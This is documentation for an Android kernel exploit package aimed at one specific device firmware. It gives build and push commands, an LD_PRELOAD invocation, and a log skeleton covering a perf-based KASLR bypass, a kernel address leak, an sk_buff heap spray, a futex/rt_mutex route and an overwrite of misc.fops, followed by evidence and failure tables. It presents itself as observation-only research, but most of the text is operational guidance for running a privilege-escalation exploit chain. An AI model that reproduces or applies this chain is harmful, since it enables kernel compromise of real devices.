# 01. Observation entry, log capture, and evidence boundary

This document describes the observable path in the current 3.1 package. It is not a post-route exploitation guide and it should not be used on non-target devices. The focus is how to capture, read, and limit the probe logs.

This package does not ship a prebuilt binary, external context copies, full console logs, logcat captures, dmesg files, or tombstones. The snippets below describe field formats; research conclusions must be collected again on the exact target firmware.

## Entry and log sources

Build:

```bash
cd exploit
make probe PROJECT=PD2314-AP3A.240905.015.A2 API=35
sha256sum build/PD2314-AP3A.240905.015.A2/bin/probe.so
```

Push and verify:

```bash
adb push build/PD2314-AP3A.240905.015.A2/bin/probe.so /data/local/tmp/probe.so
adb shell sha256sum /data/local/tmp/probe.so
```

Recommended capture:

```bash
adb logcat -b all -v threadtime > logcat-live.txt
adb shell 'Z_REFCLONE=1 LD_PRELOAD=/data/local/tmp/probe.so /system/bin/toybox id' 2>&1 | tee probe-console.txt
adb shell getprop ro.boot.bootreason
adb shell dmesg > dmesg-after.txt
```

`probe.so` prints `pr_*` logs to stdout by default. The supervisor calls `set_unbuffer()`, so `tee` preserves stage order. logcat complements stdout with system events, panic/watchdog hints, and reboot evidence. `dmesg` may be permission-limited from shell; record the result anyway.

## Execution order

1. `src/preload.c` sees `Z_REFCLONE=1`, prints `probe loader starting`, and enters `run_probe()`.
2. `targets/.../main.c` confirms probe mode and calls `refclone_load()`.
3. The supervisor forks up to three workers and sets `PROBE_WORKER=1`, `PROBE_ATTEMPT=N`, and the current `LD_PRELOAD`.
4. The worker clears its own `LD_PRELOAD`, then checks the fingerprint and kernel release.
5. The worker sets three defaults: `PAGE_PREP_SLABS=16`, `PROCESS_VM_CONSUMER_MAX_CALLS=1`, and `SLIDE_IP_ROUTE_ATTEMPTS=1`.
6. `refclone_run_probe()` runs perf KASLR, mm/slab positioning, payload preparation and spray, futex/rt_mutex route, restore, and `route-summary`.

Older local trimmed builds may print `preload starting`, `direct-demo supervisor`, or `startup context`. The current cleaned package uses `probe loader`, `probe supervisor`, and `probe context`; the field meanings are the same, and this documentation follows the current names.

## Key log skeleton

```text
[+] probe loader starting pid=...
[*] probe supervisor attempt=1/3
[+] probe worker starting pid=...
[+] probe profile applied target=... defaults=3
[+] probe context pid=... uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0
[+] probe build pid=... label=pd2314_a_15_2_17_1_w10 route=perf-kaslr+refclone
[*] perf probe policy paranoid=...
[*] perf probe ring head=... tail=... records=... samples=... kernel=... lost=... malformed=...
[*] perf probe sampled duration_ms=200 disable=0/0 min=... max=...
[*] perf probe candidate page=... window=.../... near=... far=... buckets=...
[+] slide-kaslr-perf-ok pid=... base=... slide=...
[*] prepare_kernel_page geom mode=0 standalone_tcp=0 main_tcp=1 mm_struct_sz=960 objs_per_slab=34 partials=13 collisions=8
[*] kernelsnitch waiters=... target=... baseline=... threshold=... margin=4 elapsed_ms=...
[*] kernelsnitch collision-scan found=.../... elapsed_ms=...
[*] kernelsnitch collision-scan leaked mm=...
[*] tcp payload geometry slab_base=... payload_bias=0xe80 fake_lock=... fake_w0=... fake_task=... fake_fops=...
[+] final payload invariant ok mode=active-final target=... value=...
[*] af_unix order3 staged pairs=64 requested=64
[*] af_unix order3 spray sent=4096 requested=4096 payload=0x8e80 first_failure_ret=0 first_failure_errno=0
[*] main FUTEX_CMP_REQUEUE_PI ret=... errno=...
[*] slide ip enter fd=... attempts=1 arm_seq=1 post_hold=20000 group_req_size=0x88 marker_off=0x58 ...
[*] slide ip seq=1 ret=... errno=... calls=1 sched_ok=1
[*] slide ip side effect calls=1 sched_ok=1
[*] misc.fops restore target=... original=... ret=8 errno=0
[+] misc.fops restored to ashmem_fops — ashmem safe
[+] route-summary pid=... kaslr=1 base=... slide=... route_done=1
uid=2000(shell) gid=2000(shell) ...
```

One reference run showed `records=2047 samples=2047 kernel=2047 lost=0 malformed=0`, `window=2044/2047`, KernelSnitch `found=7/7`, spray `sent=4096 requested=4096`, and route-side `sched_ok=1`. Those values indicate a high-quality observation for that run, but they do not replace fresh logs from the current device.

## Field meanings

| Field | Source | Meaning |
| --- | --- | --- |
| `attr=u:r:shell:s0` | `log_startup_context()` | SELinux context; it does not imply a privilege change |
| `route=perf-kaslr+refclone` | `probe build` | Internal source label for the selected observation path |
| `base` / `slide` | perf probe | live kernel text base and offset from `KIMAGE_TEXT_BASE` |
| `leaked mm` | KernelSnitch | `mm_struct`-near address returned after collision search |
| `slab_base` | `leaked & ~0x7fff` | estimated order-3 slab page base |
| `payload_bias=0xe80` | payload geometry | expected sk_buff copy landing bias |
| `final payload invariant ok` | user-space payload check | both 32 KiB chunks are internally consistent; not proof of kernel placement |
| `sched_ok=1` | consumer thread | at least one `sched_setattr` call on the waiter tid succeeded |
| `ret=8 errno=0` | restore | an 8-byte writeback to `dashmem_misc.fops` completed |
| `route_done=1` | worker summary | thread path reached the endpoint; not standalone vulnerability proof |

## Evidence ladder

| Conclusion level | Required correlated logs |
| --- | --- |
| Entry is valid | `probe loader starting`, `probe worker starting`, and target profile accepted |
| KASLR observation is valid | `perf probe ring` has kernel samples, candidate page accepted, `slide-kaslr-perf-ok` printed |
| slab observation is valid | `prepare_kernel_page geom` and `kernelsnitch collision-scan leaked mm` both printed |
| payload preparation is valid | payload geometry and `final payload invariant ok` both printed |
| route-side side effect appeared | `FUTEX_CMP_REQUEUE_PI`, `slide ip seq`, and `slide ip side effect ... sched_ok=1` all printed |
| strongest 3.1 closure | all above, plus restore `ret=8 errno=0` and `route-summary kaslr=1 route_done=1` |

`route-summary` is an endpoint marker, not the conclusion itself. Without restore, the log only supports that execution reached near the route end. If only toybox `id` prints `uid=2000(shell)`, that is just the host process identity and does not indicate privilege escalation.

## Failure mapping

| Symptom | Likely location | Handling |
| --- | --- | --- |
| fingerprint/kernel mismatch | target gate | Stop; do not force constants onto another firmware |
| `perf probe open errno` | perf policy or permission | Record `paranoid`, `attr_size`, and errno; KASLR evidence is absent |
| `no usable kernel samples` | sample quality | Retest with a small `PERF_PROBE_MSEC` adjustment |
| `rejected histogram` | base candidate not concentrated | Save ring statistics; do not hand-force a live base |
| `only found ... collisions` | KernelSnitch collision shortage | supervisor retry raises `PAGE_PREP_SLABS` to 32 |
| spray `sent` below `requested` | AF_UNIX/sk_buff pressure | Record first failure `ret/errno`; downgrade later-stage evidence |
| restore `ret != 8` | writeback closure failed | Save stdout/logcat/dmesg and prepare for device recovery |
| hang or reboot | kernel panic/watchdog | Long-press volume-down plus power, then collect bootreason and available dmesg |

Reboot, panic, watchdog, or long unresponsiveness are test risks accepted by the operator. On the exact target owned by the tester, the current package does not persist or install a resident privileged stage, so permanent damage should not normally occur, but important data should still be backed up first.
